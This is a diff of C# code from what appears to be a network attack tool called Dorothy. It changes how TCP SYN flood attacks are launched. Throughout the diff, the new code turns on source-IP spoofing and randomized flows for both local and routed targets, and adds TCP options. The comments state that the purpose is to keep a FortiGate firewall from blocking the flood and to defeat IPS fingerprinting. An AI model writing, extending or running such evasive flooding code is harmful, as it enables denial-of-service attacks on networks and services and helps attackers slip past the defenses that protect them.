@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
@@ -373,35 +373,34 @@ namespace Dorothy.Models
                                 bool isRouted = !IsOnSameSubnet(sourceIpObj, targetIpObj);
                                 using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token))
                                 {
-                                    // Configure routing-aware behavior
                                     tcpFlood.IsRouted = isRouted;
-                                    tcpFlood.RandomizeFlows = isRouted; // Randomize for routed (firewall evasion)
-                                    tcpFlood.AddPayload = !isRouted; // No payload for routed (firewall-friendly)
-                                    
-                                    if (isRouted)
-                                    {
-                                        _logger.LogInfo("Target is on different subnet - Using routed TCP flood (no payload, randomized flows)");
-                                    }
-                                    else
-                                    {
-                                        _logger.LogInfo("Target is on same subnet - Using local TCP flood (with payload, fixed source port)");
-                                    }
-                                    
+                                    // Always randomize flows — even local targets need varied source ports/IPs
+                                    // to prevent FortiGate from auto-blocking a single source IP/port.
+                                    tcpFlood.RandomizeFlows = true;
+                                    tcpFlood.SpoofSourceIp = true;   // Distribute across many apparent source IPs
+                                    tcpFlood.AddPayload = false;      // Bare SYN; payload on SYN is non-standard
+                                    tcpFlood.AddTcpOptions = true;    // MSS+WScale+SACK — defeats IPS fingerprinting
+
+                                    _logger.LogInfo(isRouted
+                                        ? "Target is on different subnet — routed TCP SYN flood (randomized flows, spoofed IPs, TCP options)"
+                                        : "Target is on same subnet — local TCP SYN flood (randomized flows, spoofed IPs, TCP options)");
+
                                     tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                     await tcpFlood.StartAsync();
                                 }
                                 break;
 
                             case AttackType.TcpRoutedFlood:
-                                // Explicit routed mode - always use routing-aware behavior regardless of subnet
                                 using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token))
                                 {
                                     tcpFlood.IsRouted = true;
-                                    tcpFlood.RandomizeFlows = true; // Always randomize for explicit routed mode
-                                    tcpFlood.AddPayload = false; // Never use payload in explicit routed mode
-                                    
-                                    _logger.LogInfo("Using explicit routed TCP flood mode (no payload, randomized flows)");
-                                    
+                                    tcpFlood.RandomizeFlows = true;
+                                    tcpFlood.SpoofSourceIp = true;
+                                    tcpFlood.AddPayload = false;
+                                    tcpFlood.AddTcpOptions = true;
+
+                                    _logger.LogInfo("Using explicit routed TCP flood mode (randomized flows, spoofed IPs, TCP options)");
+
                                     tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                     await tcpFlood.StartAsync();
                                 }
